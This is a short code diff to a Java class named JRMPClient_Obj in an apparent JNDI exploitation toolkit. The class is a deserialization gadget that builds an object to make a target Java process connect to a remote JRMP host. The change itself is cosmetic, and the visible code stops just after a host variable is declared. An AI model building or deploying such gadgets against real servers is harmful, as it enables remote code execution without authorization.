@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.LiveRef;
@@ -11,7 +10,7 @@ import java.rmi.server.RemoteObjectInvocationHandler;
 import java.util.Random;
 
 @Authors({"mbechler"})
-public class JRMPClient_Obj implements ObjectPayload<RemoteObjectInvocationHandler>{
+public class JRMPClient_Obj implements ObjectPayload<RemoteObjectInvocationHandler> {
     @Override
     public RemoteObjectInvocationHandler getObject(String command) throws Exception {
         String host;
